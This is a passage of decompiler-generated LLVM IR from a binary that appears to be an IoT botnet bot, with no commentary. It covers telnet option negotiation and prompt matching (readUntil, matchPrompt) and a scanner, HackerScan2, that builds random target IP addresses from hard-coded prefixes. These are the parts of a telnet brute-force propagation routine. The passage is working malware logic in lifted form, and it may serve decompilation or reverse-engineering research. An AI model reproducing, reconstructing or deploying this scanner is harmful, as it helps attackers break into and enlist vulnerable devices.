  %v2_8049806 = load i8, i8* %v1_8049792, align 1
  %v11_8049809 = icmp eq i8 %v2_8049806, -2
  %v1_804980b = icmp eq i1 %v11_8049809, false
  br i1 %v1_804980b, label %dec_label_pc_8049813, label %dec_label_pc_804980d

dec_label_pc_804980d:                             ; preds = %dec_label_pc_8049802
  store i8 -4, i8* %stack_var_-5, align 1
  br label %dec_label_pc_8049858

dec_label_pc_8049813:                             ; preds = %dec_label_pc_8049802
  %v2_8049817 = load i8, i8* %v1_8049792, align 1
  %v10_804981a = icmp eq i8 %v2_8049817, 3
  %v1_804981c = icmp eq i1 %v10_804981a, false
  %v11_8049843 = icmp eq i8 %v2_8049817, -3
  %v1_8049845 = icmp eq i1 %v11_8049843, false
  br i1 %v1_804981c, label %dec_label_pc_804983c, label %dec_label_pc_804981e

dec_label_pc_804981e:                             ; preds = %dec_label_pc_8049813
  %. = select i1 %v1_8049845, i8 -3, i8 -5
  store i8 %., i8* %stack_var_-5, align 1
  br label %dec_label_pc_8049858

dec_label_pc_804983c:                             ; preds = %dec_label_pc_8049813
  %.3 = select i1 %v1_8049845, i8 -2, i8 -4
  store i8 %.3, i8* %stack_var_-5, align 1
  br label %dec_label_pc_8049858

dec_label_pc_8049858:                             ; preds = %dec_label_pc_804981e, %dec_label_pc_804980d, %dec_label_pc_80497fc, %dec_label_pc_804983c
  %v4_8049875 = call i32 @__libc_send(i32 %arg1, i32 %v2_80497df, i32 1, i32 16384)
  %v1_804987d = add i32 %arg2, 2
  %v4_804989a = call i32 @__libc_send(i32 %arg1, i32 %v1_804987d, i32 1, i32 16384)
  %v2_80498a9.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80498a6

dec_label_pc_80498a6:                             ; preds = %dec_label_pc_80497b1, %dec_label_pc_8049858, %entry
  %v2_80498a9 = phi i32 [ %v0_8049788, %dec_label_pc_80497b1 ], [ %v2_80498a9.pre, %dec_label_pc_8049858 ], [ %v0_8049788, %entry ]
  store i32 %v2_80498a9, i32* @ebp, align 4
  ret i32 0

; uselistorder directives
  uselistorder i8* %stack_var_-5, { 5, 4, 3, 2, 0, 1 }
  uselistorder i8 -3, { 1, 0 }
  uselistorder i8 -4, { 1, 2, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80498a6, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8049858, { 3, 0, 1, 2 }
}

define i32 @matchPrompt(i8* %arg1) local_unnamed_addr {
entry:
  %v4_80498b9 = ptrtoint i8* %arg1 to i32
  %v3_80498ca = call i32 @_strlen(i8* %arg1)
  %v4_80498ca = mul i32 %v3_80498ca, -1
  %v1_80498d0 = sub i32 0, %v4_80498ca
  %v6_80498f7 = sub i32 %v4_80498b9, %v4_80498ca
  br label %dec_label_pc_804997f

dec_label_pc_80498e7:                             ; preds = %dec_label_pc_804993a, %dec_label_pc_8049922, %dec_label_pc_804990a, %dec_label_pc_80498f2
  %v4_80498e7 = add nsw i32 %stack_var_-12.032, 1
  %v7_80498f0 = icmp slt i32 %v4_80498e7, %v1_80498d0
  br i1 %v7_80498f0, label %dec_label_pc_80498f2, label %dec_label_pc_80498ea.dec_label_pc_8049952_crit_edge

dec_label_pc_80498ea.dec_label_pc_8049952_crit_edge: ; preds = %dec_label_pc_80498e7, %dec_label_pc_80498ea.preheader
  %stack_var_-12.0.lcssa = phi i32 [ %stack_var_-12.1, %dec_label_pc_80498ea.preheader ], [ %v4_80498e7, %dec_label_pc_80498e7 ]
  %.pre = sub i32 %v6_80498f7, %stack_var_-12.0.lcssa
  %.pre9 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_8049952

dec_label_pc_80498f2:                             ; preds = %dec_label_pc_80498ea.preheader, %dec_label_pc_80498e7
  %stack_var_-12.032 = phi i32 [ %v4_80498e7, %dec_label_pc_80498e7 ], [ %stack_var_-12.1, %dec_label_pc_80498ea.preheader ]
  %v2_80498ff = sub i32 %v6_80498f7, %stack_var_-12.032
  %v1_8049903 = inttoptr i32 %v2_80498ff to i8*
  %v2_8049903 = load i8, i8* %v1_8049903, align 1
  %v4_8049906 = icmp eq i8 %v2_8049903, 0
  br i1 %v4_8049906, label %dec_label_pc_80498e7, label %dec_label_pc_804990a

dec_label_pc_804990a:                             ; preds = %dec_label_pc_80498f2
  %v2_804991b = load i8, i8* %v1_8049903, align 1
  %v7_804991e = icmp eq i8 %v2_804991b, 32
  br i1 %v7_804991e, label %dec_label_pc_80498e7, label %dec_label_pc_8049922

dec_label_pc_8049922:                             ; preds = %dec_label_pc_804990a
  %v2_8049933 = load i8, i8* %v1_8049903, align 1
  %v10_8049936 = icmp eq i8 %v2_8049933, 13
  br i1 %v10_8049936, label %dec_label_pc_80498e7, label %dec_label_pc_804993a

dec_label_pc_804993a:                             ; preds = %dec_label_pc_8049922
  %v2_804994b = load i8, i8* %v1_8049903, align 1
  %v10_804994e = icmp eq i8 %v2_804994b, 10
  br i1 %v10_804994e, label %dec_label_pc_80498e7, label %dec_label_pc_8049952

dec_label_pc_8049952:                             ; preds = %dec_label_pc_804993a, %dec_label_pc_80498ea.dec_label_pc_8049952_crit_edge
  %stack_var_-12.022 = phi i32 [ %stack_var_-12.0.lcssa, %dec_label_pc_80498ea.dec_label_pc_8049952_crit_edge ], [ %stack_var_-12.032, %dec_label_pc_804993a ]
  %v1_8049963.pre-phi = phi i8* [ %.pre9, %dec_label_pc_80498ea.dec_label_pc_8049952_crit_edge ], [ %v1_8049903, %dec_label_pc_804993a ]
  %v2_8049963 = load i8, i8* %v1_8049963.pre-phi, align 1
  %v6_8049969 = add i32 %storemerge2, ptrtoint ([6 x i8]* @global_var_80590ea.26 to i32)
  %v1_804996c = inttoptr i32 %v6_8049969 to i8*
  %v2_804996c = load i8, i8* %v1_804996c, align 1
  %v15_804996f = icmp eq i8 %v2_8049963, %v2_804996c
  %v1_8049971 = icmp eq i1 %v15_804996f, false
  br i1 %v1_8049971, label %dec_label_pc_804997c, label %dec_label_pc_80499a9

dec_label_pc_804997c:                             ; preds = %dec_label_pc_8049952
  %v4_804997c = add i32 %storemerge2, 1
  br label %dec_label_pc_804997f

dec_label_pc_804997f:                             ; preds = %entry, %dec_label_pc_804997c
  %stack_var_-12.1 = phi i32 [ 0, %entry ], [ %stack_var_-12.022, %dec_label_pc_804997c ]
  %storemerge2 = phi i32 [ 0, %entry ], [ %v4_804997c, %dec_label_pc_804997c ]
  %v3_8049993 = call i32 @_strlen(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80590ea.26, i32 0, i32 0))
  %v7_804999a = icmp ult i32 %storemerge2, %v3_8049993
  br i1 %v7_804999a, label %dec_label_pc_80498ea.preheader, label %dec_label_pc_80499a9

dec_label_pc_80498ea.preheader:                   ; preds = %dec_label_pc_804997f
  %v7_80498f031 = icmp slt i32 %stack_var_-12.1, %v1_80498d0
  br i1 %v7_80498f031, label %dec_label_pc_80498f2, label %dec_label_pc_80498ea.dec_label_pc_8049952_crit_edge

dec_label_pc_80499a9:                             ; preds = %dec_label_pc_804997f, %dec_label_pc_8049952
  %storemerge = phi i32 [ 1, %dec_label_pc_8049952 ], [ 0, %dec_label_pc_804997f ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %stack_var_-12.1, { 2, 1, 0 }
  uselistorder i32 %v6_80498f7, { 1, 0 }
  uselistorder [6 x i8]* @global_var_80590ea.26, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804997f, { 1, 0 }
  uselistorder label %dec_label_pc_80498ea.dec_label_pc_8049952_crit_edge, { 1, 0 }
}

define i32 @readUntil(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i8* %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_-168, align 4
  %v2_80499f8 = ptrtoint i32* %stack_var_-160 to i32
  %tmp28 = bitcast i32* %stack_var_-160 to i8*
  %v1_8049a12 = urem i32 %arg1, 32
  %v9_8049a15 = shl i32 1, %v1_8049a12
  %v1_8049a20 = add i32 %arg1, 1
  %v2_8049a21 = ptrtoint i32* %stack_var_-168 to i32
  %v5_8049a58 = ptrtoint i8* %arg6 to i32
  %v2_8049b2c = inttoptr i32 %arg2 to i8*
  %v4_8049b35 = icmp eq i32 %arg3, 0
  %v1_8049b5635 = add i32 %arg8, 2
  %v5_8049b5c44 = icmp slt i32 %v1_8049b5635, %arg7
  br i1 %v5_8049b5c44, label %dec_label_pc_8049b5e.lr.ph, label %dec_label_pc_8049b7a

dec_label_pc_8049b5e.lr.ph:                       ; preds = %entry
  %v2_8049a0c = udiv i32 %arg1, 32
  %v2_8049a15 = mul nuw nsw i32 %v2_8049a0c, 4
  %v3_8049a15 = add nsw i32 %v2_8049a15, -156
  %tmp32 = icmp slt i32 %arg5, 1
  %tmp33 = icmp eq i1 %tmp32, false
  br label %dec_label_pc_8049b5e

dec_label_pc_80499ee:                             ; preds = %dec_label_pc_8049b6c, %dec_label_pc_8049b5e
  store i32 %v2_80499f8, i32* @edi, align 4
  %v5_80499ff = call i8* @_memset(i8* %tmp28, i32 0, i32 32)
  %v0_8049a15 = load i32, i32* @ebp, align 4
  %v4_8049a15 = add i32 %v3_8049a15, %v0_8049a15
  %v5_8049a15 = inttoptr i32 %v4_8049a15 to i32*
  %v6_8049a15 = load i32, i32* %v5_8049a15, align 4
  %v12_8049a15 = or i32 %v6_8049a15, %v9_8049a15
  store i32 %v12_8049a15, i32* %v5_8049a15, align 4
  %v5_8049a48 = call i32 @__libc_select(i32 %v1_8049a20, i32 %v2_80499f8, i32 0, i32 0, i32 %v2_8049a21)
  %tmp29 = icmp slt i32 %v5_8049a48, 1
  br i1 %tmp29, label %dec_label_pc_8049b7a, label %dec_label_pc_8049a55

dec_label_pc_8049a55:                             ; preds = %dec_label_pc_80499ee
  %v6_8049a58 = add i32 %stack_var_-32.045, %v5_8049a58
  %v5_8049a5b = inttoptr i32 %v6_8049a58 to i8*
  %v4_8049a7b = call i32 @__libc_recv(i32 %arg1, i32 %v6_8049a58, i32 1, i32 0)
  %v13_8049a83 = icmp eq i32 %v4_8049a7b, -1
  br i1 %v13_8049a83, label %dec_label_pc_8049b96, label %dec_label_pc_8049a89

dec_label_pc_8049a89:                             ; preds = %dec_label_pc_8049a55
  %v4_8049a89 = icmp eq i32 %v4_8049a7b, 0
  %v1_8049a8d = icmp eq i1 %v4_8049a89, false
  br i1 %v1_8049a8d, label %dec_label_pc_8049a9e, label %dec_label_pc_8049b96

dec_label_pc_8049a9e:                             ; preds = %dec_label_pc_8049a89
  %v5_8049aa1 = add i32 %v4_8049a7b, %stack_var_-32.045
  %v2_8049aa7 = load i8, i8* %v5_8049a5b, align 1
  %v11_8049aaa = icmp eq i8 %v2_8049aa7, -1
  %v1_8049aac = icmp eq i1 %v11_8049aaa, false
  br i1 %v1_8049aac, label %dec_label_pc_8049b1f, label %dec_label_pc_8049aae

dec_label_pc_8049aae:                             ; preds = %dec_label_pc_8049a9e
  %v1_8049ab1 = add i32 %v6_8049a58, 1
  %v4_8049acc = call i32 @__libc_recv(i32 %arg1, i32 %v1_8049ab1, i32 2, i32 0)
  %v13_8049ad4 = icmp eq i32 %v4_8049acc, -1
  br i1 %v13_8049ad4, label %dec_label_pc_8049b96, label %dec_label_pc_8049ada

dec_label_pc_8049ada:                             ; preds = %dec_label_pc_8049aae
  %v4_8049ada = icmp eq i32 %v4_8049acc, 0
  %v1_8049ade = icmp eq i1 %v4_8049ada, false
  br i1 %v1_8049ade, label %dec_label_pc_8049aef, label %dec_label_pc_8049b96

dec_label_pc_8049aef:                             ; preds = %dec_label_pc_8049ada
  %v5_8049af2 = add i32 %v4_8049acc, %v5_8049aa1
  %v3_8049b0a = call i32 @negotiate(i32 %arg1, i32 %v6_8049a58, i32 3)
  %v1_8049b0f = icmp eq i32 %v3_8049b0a, 0
  %v1_8049b11 = icmp eq i1 %v1_8049b0f, false
  br i1 %v1_8049b11, label %dec_label_pc_8049b53.backedge, label %dec_label_pc_8049b96

dec_label_pc_8049b53.backedge:                    ; preds = %dec_label_pc_8049aef, %dec_label_pc_8049b35, %dec_label_pc_8049b3b
  %stack_var_-32.0.be = phi i32 [ %v5_8049aa1, %dec_label_pc_8049b35 ], [ %v5_8049aa1, %dec_label_pc_8049b3b ], [ %v5_8049af2, %dec_label_pc_8049aef ]
  %v1_8049b56 = add i32 %stack_var_-32.0.be, 2
  %v5_8049b5c = icmp slt i32 %v1_8049b56, %arg7
  br i1 %v5_8049b5c, label %dec_label_pc_8049b53.backedge.dec_label_pc_8049b5e_crit_edge, label %dec_label_pc_8049b7a

dec_label_pc_8049b53.backedge.dec_label_pc_8049b5e_crit_edge: ; preds = %dec_label_pc_8049b53.backedge
  %v3_8049b5e.pre = load i32, i32* %stack_var_-168, align 4
  br label %dec_label_pc_8049b5e

dec_label_pc_8049b1f:                             ; preds = %dec_label_pc_8049a9e
  %v3_8049b2c = call i32 @strstr(i32 %v5_8049a58, i8* %v2_8049b2c)
  %v1_8049b31 = icmp eq i32 %v3_8049b2c, 0
  %v1_8049b33 = icmp eq i1 %v1_8049b31, false
  br i1 %v1_8049b33, label %dec_label_pc_8049b7a, label %dec_label_pc_8049b35

dec_label_pc_8049b35:                             ; preds = %dec_label_pc_8049b1f
  br i1 %v4_8049b35, label %dec_label_pc_8049b53.backedge, label %dec_label_pc_8049b3b

dec_label_pc_8049b3b:                             ; preds = %dec_label_pc_8049b35
  %v2_8049b41 = call i32 @matchPrompt(i8* %arg6)
  %v1_8049b46 = icmp eq i32 %v2_8049b41, 0
  br i1 %v1_8049b46, label %dec_label_pc_8049b53.backedge, label %dec_label_pc_8049b7a

dec_label_pc_8049b5e:                             ; preds = %dec_label_pc_8049b53.backedge.dec_label_pc_8049b5e_crit_edge, %dec_label_pc_8049b5e.lr.ph
  %v3_8049b5e = phi i32 [ %arg4, %dec_label_pc_8049b5e.lr.ph ], [ %v3_8049b5e.pre, %dec_label_pc_8049b53.backedge.dec_label_pc_8049b5e_crit_edge ]
  %stack_var_-32.045 = phi i32 [ %arg8, %dec_label_pc_8049b5e.lr.ph ], [ %stack_var_-32.0.be, %dec_label_pc_8049b53.backedge.dec_label_pc_8049b5e_crit_edge ]
  %tmp30 = icmp slt i32 %v3_8049b5e, 1
  %tmp31 = icmp eq i1 %tmp30, false
  br i1 %tmp31, label %dec_label_pc_80499ee, label %dec_label_pc_8049b6c

dec_label_pc_8049b6c:                             ; preds = %dec_label_pc_8049b5e
  br i1 %tmp33, label %dec_label_pc_80499ee, label %dec_label_pc_8049b7a

dec_label_pc_8049b7a:                             ; preds = %dec_label_pc_80499ee, %dec_label_pc_8049b6c, %dec_label_pc_8049b53.backedge, %dec_label_pc_8049b3b, %dec_label_pc_8049b1f, %entry
  %stack_var_-24.0 = phi i32 [ 0, %entry ], [ 1, %dec_label_pc_8049b1f ], [ 1, %dec_label_pc_8049b3b ], [ 0, %dec_label_pc_8049b53.backedge ], [ 0, %dec_label_pc_8049b6c ], [ 0, %dec_label_pc_80499ee ]
  br label %dec_label_pc_8049b96

dec_label_pc_8049b96:                             ; preds = %dec_label_pc_8049aef, %dec_label_pc_8049aae, %dec_label_pc_8049ada, %dec_label_pc_8049a55, %dec_label_pc_8049a89, %dec_label_pc_8049b7a
  %stack_var_-172.0 = phi i32 [ %stack_var_-24.0, %dec_label_pc_8049b7a ], [ 0, %dec_label_pc_8049a89 ], [ 0, %dec_label_pc_8049a55 ], [ 0, %dec_label_pc_8049ada ], [ 0, %dec_label_pc_8049aae ], [ 0, %dec_label_pc_8049aef ]
  ret i32 %stack_var_-172.0

; uselistorder directives
  uselistorder i32 %stack_var_-32.0.be, { 1, 0 }
  uselistorder i32 %v4_8049acc, { 1, 2, 0 }
  uselistorder i32 %v4_8049a7b, { 1, 2, 0 }
  uselistorder i32 %v5_8049a58, { 1, 0 }
  uselistorder i32* %stack_var_-168, { 0, 2, 1 }
  uselistorder i32 %arg7, { 1, 0 }
  uselistorder i32 %arg1, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_8049b96, { 5, 0, 2, 1, 4, 3 }
  uselistorder label %dec_label_pc_8049b7a, { 1, 3, 4, 2, 0, 5 }
  uselistorder label %dec_label_pc_8049b53.backedge, { 2, 1, 0 }
}

define i32 @HackerScan2(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8049ba8 = load i32, i32* @ebx, align 4
  store i32 %v0_8049ba8, i32* %stack_var_-8, align 4
  store i8 0, i8* @global_var_805e497.27, align 1
  store i8 0, i8* @global_var_805e498.28, align 8
  store i8 0, i8* @global_var_805e499.29, align 1
  store i8 0, i8* @global_var_805e49a.30, align 2
  %v1_8049bc8 = call i32 @random()
  %v2_8049bea = sdiv i32 %v1_8049bc8, 51
  store i32 %v2_8049bea, i32* @ebx, align 4
  %tmp = mul i32 %v2_8049bea, -255
  %v2_8049bfa = add i32 %v1_8049bc8, %tmp
  %v14_8049bfa = trunc i32 %v2_8049bfa to i8
  store i32 %v2_8049bfa, i32* @eax, align 4
  store i8 %v14_8049bfa, i8* @global_var_805e497.27, align 1
  %v1_8049c08 = call i32 @random()
  %v2_8049c2a = sdiv i32 %v1_8049c08, 51
  store i32 %v2_8049c2a, i32* @ebx, align 4
  %tmp21 = mul i32 %v2_8049c2a, -255
  %v2_8049c3a = add i32 %v1_8049c08, %tmp21
  %v14_8049c3a = trunc i32 %v2_8049c3a to i8
  store i32 %v2_8049c3a, i32* @eax, align 4
  store i8 %v14_8049c3a, i8* @global_var_805e498.28, align 8
  %v1_8049c48 = call i32 @random()
  %v2_8049c6a = sdiv i32 %v1_8049c48, 51
  store i32 %v2_8049c6a, i32* @ebx, align 4
  %tmp22 = mul i32 %v2_8049c6a, -255
  %v2_8049c7a = add i32 %v1_8049c48, %tmp22
  %v14_8049c7a = trunc i32 %v2_8049c7a to i8
  store i32 %v2_8049c7a, i32* @eax, align 4
  store i8 %v14_8049c7a, i8* @global_var_805e499.29, align 1
  %v1_8049c88 = call i32 @random()
  %v2_8049caa = sdiv i32 %v1_8049c88, 51
  store i32 %v2_8049caa, i32* @ebx, align 4
  %tmp23 = mul i32 %v2_8049caa, -255
  %v2_8049cba = add i32 %v1_8049c88, %tmp23
  %v14_8049cba = trunc i32 %v2_8049cba to i8
  store i32 %v2_8049cba, i32* @eax, align 4
  store i8 %v14_8049cba, i8* @global_var_805e49a.30, align 2
  %v1_8049cc8 = call i32 @random()
  %v2_8049ce5 = srem i32 %v1_8049cc8, 208
  %v12_8049cff = icmp eq i32 %v2_8049ce5, 0
  store i32 %v2_8049ce5, i32* @edx, align 4
  %v1_8049d0a = icmp eq i1 %v12_8049cff, false
  br i1 %v1_8049d0a, label %dec_label_pc_8049d3c, label %dec_label_pc_8049d0c

dec_label_pc_8049d0c:                             ; preds = %entry
  %v0_8049d0c = load i8, i8* @global_var_805e49a.30, align 2
  %v1_8049d0c = zext i8 %v0_8049d0c to i32
  store i32 %v1_8049d0c, i32* @edx, align 4
  %v0_8049d16 = load i8, i8* @global_var_805e499.29, align 1
  %v1_8049d16 = zext i8 %v0_8049d16 to i32
  %v2_8049d25 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049d25, i32* @ebx, align 4
  %v4_8049d37 = call i32 @szprintf(i32 %v2_8049d25, i32 ptrtoint ([12 x i8]* @global_var_80590f1.31 to i32), i32 %v1_8049d16)
  br label %dec_label_pc_8049d3c

dec_label_pc_8049d3c:                             ; preds = %entry, %dec_label_pc_8049d0c
  %v13_8049d3c = icmp eq i32 %v2_8049ce5, 1
  %v1_8049d40 = icmp eq i1 %v13_8049d3c, false
  br i1 %v1_8049d40, label %dec_label_pc_8049d72, label %dec_label_pc_8049d42

dec_label_pc_8049d42:                             ; preds = %dec_label_pc_8049d3c
  %v0_8049d42 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_8049d42 = zext i8 %v0_8049d42 to i32
  store i32 %v1_8049d42, i32* @edx, align 4
  %v0_8049d4c = load i8, i8* @global_var_805e499.29, align 1
  %v1_8049d4c = zext i8 %v0_8049d4c to i32
  %v2_8049d5b = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049d5b, i32* @ebx, align 4
  %v4_8049d6d = call i32 @szprintf(i32 %v2_8049d5b, i32 ptrtoint ([14 x i8]* @global_var_80590fd.32 to i32), i32 %v1_8049d4c)
  br label %dec_label_pc_8049d72

dec_label_pc_8049d72:                             ; preds = %dec_label_pc_8049d3c, %dec_label_pc_8049d42
  %v13_8049d72 = icmp eq i32 %v2_8049ce5, 2
  %v1_8049d76 = icmp eq i1 %v13_8049d72, false
  br i1 %v1_8049d76, label %dec_label_pc_8049da8, label %dec_label_pc_8049d78

dec_label_pc_8049d78:                             ; preds = %dec_label_pc_8049d72
  %v0_8049d78 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_8049d78 = zext i8 %v0_8049d78 to i32
  store i32 %v1_8049d78, i32* @edx, align 4
  %v0_8049d82 = load i8, i8* @global_var_805e499.29, align 1
  %v1_8049d82 = zext i8 %v0_8049d82 to i32
  %v2_8049d91 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049d91, i32* @ebx, align 4
  %v4_8049da3 = call i32 @szprintf(i32 %v2_8049d91, i32 ptrtoint ([11 x i8]* @global_var_805910b.33 to i32), i32 %v1_8049d82)
  br label %dec_label_pc_8049da8

dec_label_pc_8049da8:                             ; preds = %dec_label_pc_8049d72, %dec_label_pc_8049d78
  %v13_8049da8 = icmp eq i32 %v2_8049ce5, 3
  %v1_8049dac = icmp eq i1 %v13_8049da8, false
  br i1 %v1_8049dac, label %dec_label_pc_8049dde, label %dec_label_pc_8049dae

dec_label_pc_8049dae:                             ; preds = %dec_label_pc_8049da8
  %v0_8049dae = load i8, i8* @global_var_805e49a.30, align 2
  %v1_8049dae = zext i8 %v0_8049dae to i32
  store i32 %v1_8049dae, i32* @edx, align 4
  %v0_8049db8 = load i8, i8* @global_var_805e499.29, align 1
  %v1_8049db8 = zext i8 %v0_8049db8 to i32
  %v2_8049dc7 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049dc7, i32* @ebx, align 4
  %v4_8049dd9 = call i32 @szprintf(i32 %v2_8049dc7, i32 ptrtoint ([13 x i8]* @global_var_8059116.34 to i32), i32 %v1_8049db8)
  br label %dec_label_pc_8049dde

dec_label_pc_8049dde:                             ; preds = %dec_label_pc_8049da8, %dec_label_pc_8049dae
  %v13_8049dde = icmp eq i32 %v2_8049ce5, 4
  %v1_8049de2 = icmp eq i1 %v13_8049dde, false
  br i1 %v1_8049de2, label %dec_label_pc_8049e14, label %dec_label_pc_8049de4

dec_label_pc_8049de4:                             ; preds = %dec_label_pc_8049dde
  %v0_8049de4 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_8049de4 = zext i8 %v0_8049de4 to i32
  store i32 %v1_8049de4, i32* @edx, align 4
  %v0_8049dee = load i8, i8* @global_var_805e499.29, align 1
  %v1_8049dee = zext i8 %v0_8049dee to i32
  %v2_8049dfd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049dfd, i32* @ebx, align 4
  %v4_8049e0f = call i32 @szprintf(i32 %v2_8049dfd, i32 ptrtoint ([11 x i8]* @global_var_8059123.35 to i32), i32 %v1_8049dee)
  br label %dec_label_pc_8049e14

dec_label_pc_8049e14:                             ; preds = %dec_label_pc_8049dde, %dec_label_pc_8049de4
  %v13_8049e14 = icmp eq i32 %v2_8049ce5, 5
  %v1_8049e18 = icmp eq i1 %v13_8049e14, false
  br i1 %v1_8049e18, label %dec_label_pc_8049e4a, label %dec_label_pc_8049e1a

dec_label_pc_8049e1a:                             ; preds = %dec_label_pc_8049e14
  %v0_8049e1a = load i8, i8* @global_var_805e49a.30, align 2
  %v1_8049e1a = zext i8 %v0_8049e1a to i32
  store i32 %v1_8049e1a, i32* @edx, align 4
  %v0_8049e24 = load i8, i8* @global_var_805e499.29, align 1
  %v1_8049e24 = zext i8 %v0_8049e24 to i32
  %v2_8049e33 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049e33, i32* @ebx, align 4
  %v4_8049e45 = call i32 @szprintf(i32 %v2_8049e33, i32 ptrtoint ([13 x i8]* @global_var_805912e.36 to i32), i32 %v1_8049e24)
  br label %dec_label_pc_8049e4a

dec_label_pc_8049e4a:                             ; preds = %dec_label_pc_8049e14, %dec_label_pc_8049e1a
  %v13_8049e4a = icmp eq i32 %v2_8049ce5, 6
  %v1_8049e4e = icmp eq i1 %v13_8049e4a, false
  br i1 %v1_8049e4e, label %dec_label_pc_8049e80, label %dec_label_pc_8049e50

dec_label_pc_8049e50:                             ; preds = %dec_label_pc_8049e4a
  %v0_8049e50 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_8049e50 = zext i8 %v0_8049e50 to i32
  store i32 %v1_8049e50, i32* @edx, align 4
  %v0_8049e5a = load i8, i8* @global_var_805e499.29, align 1
  %v1_8049e5a = zext i8 %v0_8049e5a to i32
  %v2_8049e69 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049e69, i32* @ebx, align 4
  %v4_8049e7b = call i32 @szprintf(i32 %v2_8049e69, i32 ptrtoint ([12 x i8]* @global_var_805913b.37 to i32), i32 %v1_8049e5a)
  br label %dec_label_pc_8049e80

dec_label_pc_8049e80:                             ; preds = %dec_label_pc_8049e4a, %dec_label_pc_8049e50
  %v13_8049e80 = icmp eq i32 %v2_8049ce5, 7
  %v1_8049e84 = icmp eq i1 %v13_8049e80, false
  br i1 %v1_8049e84, label %dec_label_pc_8049eb6, label %dec_label_pc_8049e86

dec_label_pc_8049e86:                             ; preds = %dec_label_pc_8049e80
  %v0_8049e86 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_8049e86 = zext i8 %v0_8049e86 to i32
  store i32 %v1_8049e86, i32* @edx, align 4
  %v0_8049e90 = load i8, i8* @global_var_805e499.29, align 1
  %v1_8049e90 = zext i8 %v0_8049e90 to i32
  %v2_8049e9f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049e9f, i32* @ebx, align 4
  %v4_8049eb1 = call i32 @szprintf(i32 %v2_8049e9f, i32 ptrtoint ([13 x i8]* @global_var_8059147.38 to i32), i32 %v1_8049e90)
  br label %dec_label_pc_8049eb6

dec_label_pc_8049eb6:                             ; preds = %dec_label_pc_8049e80, %dec_label_pc_8049e86
  %v13_8049eb6 = icmp eq i32 %v2_8049ce5, 8
  %v1_8049eba = icmp eq i1 %v13_8049eb6, false
  br i1 %v1_8049eba, label %dec_label_pc_8049eec, label %dec_label_pc_8049ebc

dec_label_pc_8049ebc:                             ; preds = %dec_label_pc_8049eb6
  %v0_8049ebc = load i8, i8* @global_var_805e49a.30, align 2
  %v1_8049ebc = zext i8 %v0_8049ebc to i32
  store i32 %v1_8049ebc, i32* @edx, align 4
  %v0_8049ec6 = load i8, i8* @global_var_805e499.29, align 1
  %v1_8049ec6 = zext i8 %v0_8049ec6 to i32
  %v2_8049ed5 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049ed5, i32* @ebx, align 4
  %v4_8049ee7 = call i32 @szprintf(i32 %v2_8049ed5, i32 ptrtoint ([13 x i8]* @global_var_8059154.39 to i32), i32 %v1_8049ec6)
  br label %dec_label_pc_8049eec

dec_label_pc_8049eec:                             ; preds = %dec_label_pc_8049eb6, %dec_label_pc_8049ebc
  %v13_8049eec = icmp eq i32 %v2_8049ce5, 9
  %v1_8049ef0 = icmp eq i1 %v13_8049eec, false
  br i1 %v1_8049ef0, label %dec_label_pc_8049f22, label %dec_label_pc_8049ef2

dec_label_pc_8049ef2:                             ; preds = %dec_label_pc_8049eec
  %v0_8049ef2 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_8049ef2 = zext i8 %v0_8049ef2 to i32
  store i32 %v1_8049ef2, i32* @edx, align 4
  %v0_8049efc = load i8, i8* @global_var_805e499.29, align 1
  %v1_8049efc = zext i8 %v0_8049efc to i32
  %v2_8049f0b = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049f0b, i32* @ebx, align 4
  %v4_8049f1d = call i32 @szprintf(i32 %v2_8049f0b, i32 ptrtoint ([13 x i8]* @global_var_8059161.40 to i32), i32 %v1_8049efc)
  br label %dec_label_pc_8049f22

dec_label_pc_8049f22:                             ; preds = %dec_label_pc_8049eec, %dec_label_pc_8049ef2
  %v13_8049f22 = icmp eq i32 %v2_8049ce5, 10
  %v1_8049f26 = icmp eq i1 %v13_8049f22, false
  br i1 %v1_8049f26, label %dec_label_pc_8049f58, label %dec_label_pc_8049f28

dec_label_pc_8049f28:                             ; preds = %dec_label_pc_8049f22
  %v0_8049f28 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_8049f28 = zext i8 %v0_8049f28 to i32
  store i32 %v1_8049f28, i32* @edx, align 4
  %v0_8049f32 = load i8, i8* @global_var_805e499.29, align 1
  %v1_8049f32 = zext i8 %v0_8049f32 to i32
  %v2_8049f41 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049f41, i32* @ebx, align 4
  %v4_8049f53 = call i32 @szprintf(i32 %v2_8049f41, i32 ptrtoint ([14 x i8]* @global_var_805916e.41 to i32), i32 %v1_8049f32)
  br label %dec_label_pc_8049f58

dec_label_pc_8049f58:                             ; preds = %dec_label_pc_8049f22, %dec_label_pc_8049f28
  %v13_8049f58 = icmp eq i32 %v2_8049ce5, 11
